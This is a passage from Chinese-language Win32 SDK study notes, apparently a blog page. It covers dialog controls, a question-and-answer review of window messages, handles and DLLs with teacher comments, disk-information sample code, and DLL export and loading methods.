class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HWND hDlg = <span class="built_in">CreateDialog</span>(</span><br><span class="line">hInstance,</span><br><span class="line"><span class="built_in">MAKEINTRESOURCE</span>(IDD_DIALOG1),</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">DlgProc</span><br><span class="line">);</span><br><span class="line"><span class="comment">//显示窗口</span></span><br><span class="line"><span class="built_in">ShowWindow</span>(hDlg, SW_SHOW);</span><br><span class="line">MSG msg = &#123;&#125;;</span><br><span class="line"><span class="comment">// 消息循环</span></span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">GetMessage</span>(</span><br><span class="line">&amp;msg, <span class="comment">//获取到消息的结构体</span></span><br><span class="line"><span class="number">0</span>,    <span class="comment">//获取哪一个窗口的消息，为0就是所有窗口</span></span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>)</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//   5.2翻译消息</span></span><br><span class="line"><span class="built_in">TranslateMessage</span>(&amp;msg);</span><br><span class="line"><span class="comment">//   5.3转发到消息回调函数</span></span><br><span class="line"><span class="built_in">DispatchMessage</span>(&amp;msg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="对话框控件的使用"><a href="#对话框控件的使用" class="headerlink" title="对话框控件的使用"></a>对话框控件的使用</h2><h3 id="单选框"><a href="#单选框" class="headerlink" title="单选框"></a>单选框</h3><p>有一个重要操作，需要记住：分组</p><p>ctrl+D之后将同一组的radio都编为连续的序号。</p><p>将每组的第一个radio设置group为true</p><h3 id="静态文本"><a href="#静态文本" class="headerlink" title="静态文本"></a>静态文本</h3><p>一个提示语直接拖拽即可</p><h3 id="静态图片"><a href="#静态图片" class="headerlink" title="静态图片"></a>静态图片</h3><p>能够显示一个bitmap的图片</p><p>需要一个picture的控件，然后去设置两个属性</p><p>一个bmp格式的图片资源</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1,初始化图片</span></span><br><span class="line">HBITMAP hBit_map = <span class="built_in">LoadBitmap</span>(g_hInstance, <span class="built_in">MAKEINTRESOURCE</span>(IDB_BITMAP1));</span><br><span class="line">HWND hPic=<span class="built_in">GetDlgItem</span>(hMain, IDC_STATIC1);<span class="comment">//获取图片框资源句柄</span></span><br><span class="line"><span class="built_in">SendMessage</span>(hPic, STM_SETIMAGE, IMAGE_BITMAP, (LPARAM)hBit_map);</span><br></pre></td></tr></table></figure><h1 id="四、SDK问题"><a href="#四、SDK问题" class="headerlink" title="四、SDK问题"></a>四、SDK问题</h1><h2 id="问答1"><a href="#问答1" class="headerlink" title="问答1"></a>问答1</h2><p>1、什么是windows 错误码?应该在什么时候获取? 使用什么函数获取? 获取到之后如何<br>查看其所代表的内容?<br>答：windows 错误码是不同的API有不同类型的错误返回值，在API结束之后获取，可以使用SetLastError函数获取，使用错误查找工具或者在VS监视栏中输入“err,hr”查看。<br>2、如何为自己的函数定义windows 错误码，使用哪一个函数?<br>答：SetLastError函数。<br>3、在Virtual Stodio 中，在监视栏中输入什么字符，能够方便的查看错误码?<br>答：err,hr字符。<br>4、什么是句柄? 几个字节? 有什么用?<br>答：在程序设计中，句柄是一种特殊的智能指针。当一个应用程序要引用其他系统（如数据库、操作系统）所管理的内存块或对象时，就要使用句柄。在windows编程中，一个句柄是指使用的一个唯一的整数值，即一个4字节(64位程序中为8字节)长的数值，来标识应用程序中的不同对象和同类中的不同的实例，诸如，一个窗口，按钮，图标，滚动条，输出设备，控件或者文件等。<br>5、什么是实例? WinMain 函数的四个参数分别代表什么意思?<br>答：实例诸如一个窗口，按钮，图标，滚动条等，hInstance是程序实例的句柄，它是程序的加载地址，hPrevInstance这个参数已经废弃，IpCmdLine是由调用者传入的命令，nCmdShow是由调用者传入的int型参数。<br>6、请问TCHAR,_tcslen 本质是什么?由谁控制? 使用通用字符需要包含什么头文件?<br>答：T版的数据或者函数，本质上还是ascii编码或者unicode的编码，主要靠#indefine和typedef实现的，它只由编译环境自动选择，tchar.h头文件。<br>7、窗口回调函数的原型是什么?<br>答：原型如下：<br>LRESULT CALLBACK WindowProc(<br>HWND hwnd, //窗口句柄<br>UINT uMsg, //消息ID<br>WPARAM wParam, //消息参数1<br>LPARAM lParam //消息参数2<br>);<br>8、使用SPY++查看QQ 登录框类名是什么? 聊天窗口类名是什么?<br>答： TXGuiFoundation TXGuiFoundation<br>9、窗口类结构体中hbrBackground 有什么用? 请尽量详细的说明。<br>答：hbrBackground 可以刷新背景所用的画刷的句柄。Windows定义六种现有画刷：WHITE_BRUSH、LTGRAY_BRUSH、GRAY_BRUSH、DKGRAY_BRUSH、BLACK_BRUSH和NULL_BRUSH （也叫HOLLOW_BRUSH）。您可以将任何一种现有画刷选入您的装置内容中，就和您选择一种画笔一样。Windbws将HBRUSH定义为画刷的代号，所以可以先定义一个画刷代号变数：<br>HBRUSH hBrush ;<br>您可以通过呼叫GetStockObject来取得GRAY_BRUSH的代号：<br>hBrush = GetStockObject (GRAY_BRUSH) ;<br>wndclass.hbrBackground = (HBRUSH) GetStockObject (GRAY_BRUSH);//设置窗口背景画刷的句柄</p><p>10、什么是队列消息? 什么是非队列消息? 请各举出三个例子。<br>答：队列消息包括系统和线程的消息队列，队列送到系统消息队列，然后送到线程消息队列，而非队列消息是直接送给目的窗口的过程。队列消息如WM_MOUSERMOVE,WM_CHAR,WM_PAINT。非队列消息有WM_ACTIVATE,应用系统发送WM_WINDOWPOSCHANGED，SendMessage函数也会发送非队列消息。</p><p>11、PostMessage 和SendMessage 有什么区别?<br>答：PostMessage只是把消息放入队列，不管其他程序是否处理都返回，然后继续执行；而SendMessage必须等待其他程序处理消息后才返回，继续执行。PostMessage的返回值表示PostMessage函数执行是否正确；而SendMessage的返回值表示其他程序处理消息后的返回值。 PostMessage会造成消息的滞后性,而SendMessage则不会,但如果SendMessage消息处理失败,则会造成程序停止。</p><p>12、下面这个结构体是窗口类结构体，请分别说明，各个字段是什么含义。<br>答：各字段含义见注释。<br>typedef struct tagWNDCLASSW {<br>UINT style;//窗口类的风格（无符号32位整数）<br>WNDPROC lpfnWndProc;//指向窗口过程的指针<br>int cbClsExtra;//分派给窗口类的扩展的字节数<br>int cbWndExtra;//分派给窗口实例的扩展的字节数<br>HINSTANCE hInstance;.//实例句柄<br>HICON hIcon;//类图标的句柄<br>HCURSOR hCursor;//类鼠标指针的句柄<br>HBRUSH hbrBackground;//刷新背景所用的画刷的句柄<br>LPCWSTR lpszMenuName;//窗口类包含的菜单的名称<br>LPCWSTR lpszClassName;//窗口类名<br>}<br>WNDCLASSW</p><p>13、以下消息分别在什么时候触发<br>WM_LBUTTONDOWN 点击鼠标左键<br>WM_PAINT 绘制对象时<br>WM_CLOSE 点击关闭程序按钮</p><p>==================</p><p>1、窗口风格有三大风格，分别是什么? 各有什么特点?<br>答：窗口三大风格是重叠窗口(Overlapped Window)，弹出窗口(Popup Window)，子窗口(Child Window)，重叠窗口是顶级窗口，是缺省类型，它有边框，标题栏，客户区等，还有其他组件；弹出窗口也是顶级窗口，通常用于对话框或者Message对话框，它具有WS_POPUP窗口风格，隐含带有WS_CLIPSIBLINGS窗口风格。</p><p>2、WM_COMMAND 作为控件的通知消息，wParam 与lParam 分别有什么含义?<br>答：wParam是指32位的消息参数，是一个消息有关的常量值，也可能是窗口或控件的句柄， lParam 也是指32位的消息参数，通常是一个指向内存中数据的指针。</p><p>3、什么是模态对话框? 什么是非模态对话框? 用什么创建?，<br>答：模态对话框创建后一定要在用户关闭对话框后，其父窗口才能响应用户操作，否则父窗口便无法响应任何用户的操作，模态对话框函数自带消息循环；非模态对话框则是创建完后其父窗口不需要像模态窗口那样等到对话框关闭才能响应用户的操作，一样可以在对话框未关闭前响应用户操作，非模态对话框函数需要自己写消息循环。模态对话框使用DialogBox创建，非模态对话框使用CreateDialog完成。</p><p>4、控件既可以用代码创建，也可以在对话框资源上拖拽，创建控件的函数是什么?。<br>答：创建控件的函数是CreateWindow。</p><p>5、WM_NOTIFY 和WM_COMMAND 的区别。<br>答：WM_COMMAND和WM_NOTIFY都是控件通知消息，WM_NOTIFY和WM_COMMAND相比，是一种更灵活的消息格式，lParam中放的是一个称为NMHDR结构的指针。在wParam中放的则是控件的ID。最初Windows 3.x就有的控件，如Edit，Combo，List，Button等，发送的控件通知消息的格式是WM_COMMAND；而后期的Win32通用控件，如List View，Image List，IP Address，Tree View，Toolbar等，发送的都是WM_NOTIFY控件通知消息。</p><p>6、使用通用(扩展)控件的准备工作都有哪些？<br>答：在15版本以下的VS使用通用控件需要先包含<CommCtrl.h>,引入 #pragma comment(lib,”comct132.lib”)，调用InitCommonControls初始化通用控件，使用CreateWindowEx函数创建通用控件。</CommCtrl.h></p><p>==================<br>1、什么是API? 什么是动态链接库? 写出常见的动态链接库及其大体功能。<br>答：API是指API（Application Programming Interface，应用程序编程接口）是一些预先定义的函数，目的是提供应用程序与开发人员基于某软件或硬件得以访问一组历程的能力，而又无需访问源码，或理解内部工作机制的细节。<br>动态链接库的英文名称叫DynamicLinkableLibrary，它是microsoft在windows操作系统中实现共享函数库概念的一种实现方式。大多数与windows相关的磁盘文件如果不是程序模块，就是动态链接程序。<br>常见的动态链接库及其大体功能：<br>kernel32.dll Windows9x/Me中非常重要的32位动态链接库文件，属于内核级文件。它控制着系统的内存管理、数据的输入输出操作和中断处理<br>user32.dll Windows用户界面相关应用程序接口，用于包括Windows处理，基本用户界面等特性，如创建窗口和发送消息。<br>gdi32.dll Windows GDI图形用户界面相关程序，包含的函数用来绘制图像和显示文字<br>winspool.dll 一款文本编辑软件的库文件<br>comdlg32.dll Windows应用程序公用对话框模块，用于例如打开文件对话框</p><p>都包括什么?<br>2、你所知道的文件操作<br>答：文件操作包括新建打开文件CreateFile，删除指定文件DeleteFile，复制文件CopyFile，ReadFile读取文件，WriteFile写文件，GetFileAttribute获取文件属性，SetFileAttribute设置文件或目录的属性。</p><p>3、什么是进程? 什么是线程?<br>答：进程是资源的分配和调度的一个独立单元，而线程是CPU调度的基本单元，同一个进程中可以包括多个线程，并且线程共享整个进程的资源（寄存器、堆栈、上下文），一个进程至少包括一个线程。</p><p>4、Dll 可以导出什么?<br>答：Dll可以导出类和函数。</p><p>5、在编写dll 时，当我们想要导出一个东西时，有哪些方式? 分别如何实现?<br>答：一、可以使用_declspec(dllexport)，在函数声明前加_declspec(dllexport)。二、使用模块定义文件（扩展名为.def）导出，文件里面写<br>LIBRARY<br>DESCRIPTION “DLL”<br>EXPORTS<br>函数名</p><p>6、我们使用dll 的时候，通常有两种方式。分别如何实现?<br>答：见上一题。</p><p>7、什么叫做对象库? 什么叫做导入库?<br>答;对象库是一个扩展名为.LIB的文件，在这个文件的代码在运行链接器进行静态链接时被添加到程序的.EXE文件中。导入库是一种特殊的形式的对象库文件，后缀名和对象库一样，链接器用它来解析源代码中的函数调用。但是导入库不包含任何代码，它们只给链接器提供信息来建立EXE文件中用于动态链接的重定位表格。</p><p>8、什么叫做名称粉碎? 有什么用处?<br>答：名称粉碎是函数名称相同的函数在C中出现重定义，然而在C++中用于函数重载，相同的名称会粉碎成不同的函数内存地址，从而区别调用的是什么函数，由此可以实现多态。</p><h2 id="问答2"><a href="#问答2" class="headerlink" title="问答2"></a>问答2</h2><ol><li><p>怎么将”123”转换成123? 反过来呢?</p><p>使用sscanf_s函数将字符转换位数字，宽版使用stscanf_s</p><p>反过来就是先转换为数字后，反向遍历</p><p>（老师批注：stscanf_s是通用版本，根据项目默认编码方式自动匹配，wsprintf是宽版，用到通用版本才需要tchar，单纯用宽版函数是不需要tchar.h的）</p></li><li><p>“哈哈”和L”哈哈”一样吗? 哪里不一样? 怎么转换?</p><p>答：不一样，窄版和宽版，如果需要使用宽板只需在字符前加上L即可，但需包含头文件tchar.h</p></li><li><p>创建窗口的流程是什么?</p><p>1,使用WNDCLASS结构体定义窗口</p><p>2，将定义的窗口注册</p><p>3，将注册的窗口创建出来</p><p>4，更新并显示窗口</p><p>5，创建消息循环</p><p>6，回调</p></li><li><p>怎么响应窗口消息?</p><p>答：不同的消息有不同的响应方式，例如：当窗口创建的时候会产生WM_CREATE消息，点击按钮（button）时会产生WM_COMMAND消息，</p></li><li><p>wParam和lParam保存了什么信息?</p><p>答：如在响应WM_COMMAND消息时WPARAM的高位是通知码，低位是ID，LPARAM保存的是句柄</p></li><li><p>怎么响应控件的单击消息?</p><p>答：单击控件时会产生WM_COMMAND消息，在这个消息中他的WPARAM的低位是被单机控件的ID，把这个ID找出来后，通过这个ID使用GetDlgItem这个函数获取该控件的句柄从而进行想要的消息响应</p></li><li><p>如何创建单选框?</p><p>在工具栏中拖拽，然后通过WPARAM的低位ID响应，然后通过WPARAM的高位通知码获取单选框是否被点击</p></li><li><p>怎么将单选框设置为选中状态?</p><p>答：给单选框发送一个SendMessage消息第二参数BM_SETCHECK第三个参数就是设置选中的状态码1</p></li><li><p>如何获取复选框是否被选中?</p><p>使用BM_GETCHECK参数给复选框发送SendMessage消息，用BOOL值接收</p></li><li><p>如何给窗口添加主菜单?</p><p>答：资源创建，通过ID获取句柄，创建窗口时加上这个句柄</p></li><li><p>怎么在程序中加载图片资源?</p><p>答：</p><p>//加载图片</p><p>HBITMAP hBit_map = LoadBitmap(g_hInstance, MAKEINTRESOURCE(IDB_BITMAP1));</p><p>//获取图片框资源句柄</p><p>HWND hPic=GetDlgItem(hMain, IDC_STATIC1);</p><p>//设置图片</p><p>SendMessage(hPic, STM_SETIMAGE, IMAGE_BITMAP, (LPARAM)hBit_map);</p></li><li><p>怎么在窗口中弹出右键菜单</p><p>在WM_RBUTTONDOWN消息中响应右击，在这个消息中获取右击的坐标，使用这个坐标弹出窗口（TrackPopupMeun）</p></li><li><p>怎么设置和获取编辑框的文本</p><p>获取编辑框句柄GetDlgItem</p><p>创建接收文本的缓冲区WCHAR 数组</p><p>获取编辑款文本GetWindowText</p></li><li><p>下拉框怎么添加文本?</p><p>获取句柄在使用ComboBox_AddString函数添加文本</p></li><li><p>怎么结束一个对话框?</p><p>EndDiaLog</p></li><li><p>怎么获取或修改窗口的窗口风格?</p><p>获取需要修改控件的句柄，然后使用SetClassLong修改</p></li><li><p>怎么替换一个控件的消息回调函数?</p><p> 控件句柄 修改的属性 回调函数</p><p>SetWindowLong(hButton1, GWL_WNDPROC, (LONG)ButtonProc);</p></li><li><p>怎么创建DLL工程?</p><p>在新建的时候选择dll，</p></li><li><p>怎么导出函数?</p><p>两种导出方法</p><p>在头文件中声明导出_declspec(dllexport)</p><p>模块定义导出，添加一个def文件，在文件中写入EXPORTS（后跟需要导出的函数，且函数后标号）</p><p>之后再属性配置里–&gt;连接器–&gt;输入，中有一个模块定义文件，把这个选项值写成.def文件全称（xxx.def）</p></li><li><p>怎么调用从DLL导出的函数?</p><p>两种调用方式</p><p>隐式调用</p><p>包含头文件，头文件中含有导出函数的声明。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">载入lib文件  #pragma  comment（lib,“”）;</span><br><span class="line">直接调用函数即可</span><br></pre></td></tr></table></figure><p>显示调用</p><p>使用LoadLibrary（）将目标dll强行加载到进程中。<br>在 GetProcAddress()获得函数的地址。然后使用返回的函数指针调用</p><p>（老师批注：dll显式链接方式不要忘了FreeLibrary）</p></li><li><p>怎么调试DLL</p><p>（老师批注：可以通过编写调用dll函数的程序进行调试）</p></li><li><p>exe加载DLL时(使用相对路径),被加载的DLL可以放在任何目录吗,如果不能,那么都能放到哪些目录?</p><p>只能放在相对exe的相对路径中</p></li><li><p>怎么使用静态库? 和动态库相比有和区别?</p><p>使用方法是一样的，只是使用静态库编译后的程序会比动态库的程序占用空间大，因为静态库是直接把库文件载入到了程序中，而不是需要从外部调用</p></li></ol><h1 id="五、磁盘信息"><a href="#五、磁盘信息" class="headerlink" title="五、磁盘信息"></a>五、磁盘信息</h1><h2 id="获取盘符的字符串，"><a href="#获取盘符的字符串，" class="headerlink" title="获取盘符的字符串，"></a>获取盘符的字符串，</h2><p>GetLogicalDriveStrings( 100,buf);</p><p>// 把语言设置为中文</p><p>setlocale(LC_ALL, “chs”);</p><h2 id="获取驱动器类型"><a href="#获取驱动器类型" class="headerlink" title="获取驱动器类型"></a>获取驱动器类型</h2><p>，由于这里需要的是一个指针，所以需要在定义一个TCHAR*指针类型指向数组（缓冲区）</p><p>用整形接收返回值，</p><p> 2，代表可移动设备 DRIVE_REMOVABLE</p><p> 3，硬盘 DRIVE_FIXED</p><p> 4，远程设备DRIVE_REMOTE</p><p> 5，光驱 DRIVE_CDROM</p><p>GetDriveType(pTemp);</p><h2 id="计算磁盘空间"><a href="#计算磁盘空间" class="headerlink" title="计算磁盘空间"></a>计算磁盘空间</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">GetDiskFreeSpace</span>(pTemp,<span class="comment">//盘符</span></span><br><span class="line">&amp;每簇的扇区数量, </span><br><span class="line">&amp;每个扇区的容量, </span><br><span class="line">&amp;空闲簇的总量,   </span><br><span class="line">&amp;全部簇的总量 </span><br></pre></td></tr></table></figure><h2 id="查看磁盘的实例代码"><a href="#查看磁盘的实例代码" class="headerlink" title="查看磁盘的实例代码"></a>查看磁盘的实例代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 02_获取磁盘信息.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1. 获取驱动器名称</span></span><br><span class="line">TCHAR buf[<span class="number">100</span>] = &#123;&#125;;</span><br><span class="line">TCHAR* pTemp = buf;</span><br><span class="line"><span class="built_in">GetLogicalDriveStrings</span>( <span class="number">100</span>,buf);</span><br><span class="line"><span class="comment">// 把语言设置为中文</span></span><br><span class="line"><span class="built_in">setlocale</span>(LC_ALL, <span class="string">&quot;chs&quot;</span>);</span><br><span class="line"><span class="keyword">while</span> (pTemp[<span class="number">0</span>]!=<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">wprintf</span>(_T(<span class="string">&quot;%s  &quot;</span>), pTemp);</span><br><span class="line"><span class="comment">//2. 获取驱动器类型</span></span><br><span class="line">DWORD dwType = <span class="built_in">GetDriveType</span>(pTemp);</span><br><span class="line"><span class="keyword">switch</span> (dwType)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> DRIVE_REMOVABLE:</span><br><span class="line"><span class="built_in">wprintf</span>(_T(<span class="string">&quot;可移动设备 &quot;</span>));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DRIVE_FIXED:</span><br><span class="line"><span class="built_in">wprintf</span>(_T(<span class="string">&quot;硬盘 &quot;</span>));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DRIVE_REMOTE:</span><br><span class="line"><span class="built_in">wprintf</span>(_T(<span class="string">&quot;远程设备 &quot;</span>));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DRIVE_CDROM:</span><br><span class="line"><span class="built_in">wprintf</span>(_T(<span class="string">&quot;光驱 &quot;</span>));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//3. 驱动器的空间信息</span></span><br><span class="line">DWORD 每簇的扇区数量 = <span class="number">0</span>;</span><br><span class="line">DWORD 每个扇区的容量 = <span class="number">0</span>;</span><br><span class="line">DWORD 空闲簇的总量 = <span class="number">0</span>;</span><br><span class="line">DWORD 全部簇的总量 = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">GetDiskFreeSpace</span>(pTemp,</span><br><span class="line">&amp;每簇的扇区数量, </span><br><span class="line">&amp;每个扇区的容量, </span><br><span class="line">&amp;空闲簇的总量,   </span><br><span class="line">&amp;全部簇的总量     </span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;总容量为%.2lf,空闲容量为%.2lf&quot;</span>,</span><br><span class="line">(((全部簇的总量/<span class="number">1024.0</span>) * 每簇的扇区数量 * 每个扇区的容量)/<span class="number">1024</span>)/<span class="number">1024</span>,</span><br><span class="line">(((空闲簇的总量/<span class="number">1024.0</span>) * 每簇的扇区数量 * 每个扇区的容量) / <span class="number">1024</span>) / <span class="number">1024</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">pTemp += <span class="built_in">wcslen</span>(buf)+<span class="number">1</span>;</span><br><span class="line">        <span class="comment">/*wcslen遇到0会被截断，缓冲区存储的时“C:\0D:\”,所以wcslen(buf)的长度等于3，pTemp+=wcslen(buf)+1之后就是下一个盘符的开始*/</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="六、动态链接库"><a href="#六、动态链接库" class="headerlink" title="六、动态链接库"></a>六、动态链接库</h1><p>定义 DLL 应用程序的入口点</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;framework.h&quot;</span></span></span><br><span class="line"><span class="comment">//dll文件是给他人提供函数所用，不会作为一个程序单独运行，也就没有第一行执行代码的概念</span></span><br><span class="line"><span class="comment">//通常不需要理会DllMain，不会再里面写什么代码</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule, DWORD  ul_reason_for_call,LPVOID lpReserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:  <span class="comment">//进程加载</span></span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:  <span class="comment">//线程加载</span></span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:  <span class="comment">//线程卸载</span></span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:  <span class="comment">//进程卸载</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="声明导出"><a href="#声明导出" class="headerlink" title="声明导出"></a>声明导出</h2><p>在需要导出函数的头文件中声明</p><p>extern “C” _declspec(dllexport) <strong>void pr();</strong>//需要声明的函数即返回类型</p><p>注意一定要在cpp文件中包含头文件，不然找不到该函数的定义</p><h2 id="模块定义文件导出"><a href="#模块定义文件导出" class="headerlink" title="模块定义文件导出"></a>模块定义文件导出</h2><p>添加一个.def文件 ，</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">EXPORTS</span><br><span class="line">Fun1 @<span class="number">1</span></span><br><span class="line">Fun2 @<span class="number">2</span></span><br></pre></td></tr></table></figure><p>Fun1和Fun2是函数名，@1表示导出函数的序号</p><p>在属性配置里–&gt;连接器–&gt;输入，中有一个模块定义文件，把这个选项值写成.def文件全称（xxx.def）</p><p>调用dll中函数的方式，有两种：</p><h2 id="隐式调用"><a href="#隐式调用" class="headerlink" title="隐式调用"></a>隐式调用</h2><p> 包含头文件，头文件中含有导出函数的声明。<br>​ 载入lib文件 #pragma comment（lib,“”）;<br>​ 直接调用函数即可</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;..\Dll1\Dll1.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;..\\Debug\\Dll1.lib&quot;</span>)</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fun1</span>();</span><br><span class="line">    <span class="built_in">fun2</span>();</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="显示调用"><a href="#显示调用" class="headerlink" title="显示调用"></a>显示调用</h2><p>使用显示调用不需要头文件，但是你需要知道函数的原型（返回值类型，各个参数的类型）。<br>LoadLibrary（）将目标dll强行加载到本进程中。<br>GetProcAddress()获得函数的地址。<br>自然就可以调用此函数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span>  <span class="title">void</span><span class="params">(*FUN)</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">FUN g_Fun;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HMODULE hModule =  <span class="built_in">LoadLibrary</span>(<span class="string">L&quot;Dll1.dll&quot;</span>);</span><br><span class="line">    g_Fun =  (FUN)<span class="built_in">GetProcAddress</span>(hModule, <span class="string">&quot;fun1&quot;</span>);</span><br><span class="line"><span class="built_in">g_Fun</span>();</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ib文件的差别："><a href="#ib文件的差别：" class="headerlink" title="ib文件的差别："></a>ib文件的差别：</h2><p>随着dll一起生成的lib文件，称之为导入库，里面是没有代码和数据，是链接信息，供编译器再exe文件与dll文件做链接的。<br>还有一种是静态对象库，编译的时候会将静态库中的使用到的代码数据编译到exe中，exe发布就不需要携带很多文件。</p><h1 id="七、进程"><a href="#七、进程" class="headerlink" title="七、进程"></a>七、进程</h1><p>1 内核对象的概念</p><p>2 进程，模块，线程</p><p>概念</p><p>基本操作：</p><p>进程 模块 线程的遍历</p><p>进程的终止 强制结束 进程间的通讯</p><p>线程挂起 恢复 终止 强制结束</p><p>3 文件操作</p><p>难点：递归遍历文件</p><p>4 线程同步：原子操作 临界区 互斥体 事件 信号量</p><p>5 同步IO和异步IO</p><p>6 基本的网络编程 TCP UDP</p><p>7 IOCP模型</p><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>一、 如何理解内核对象的概念？</p><p>a. 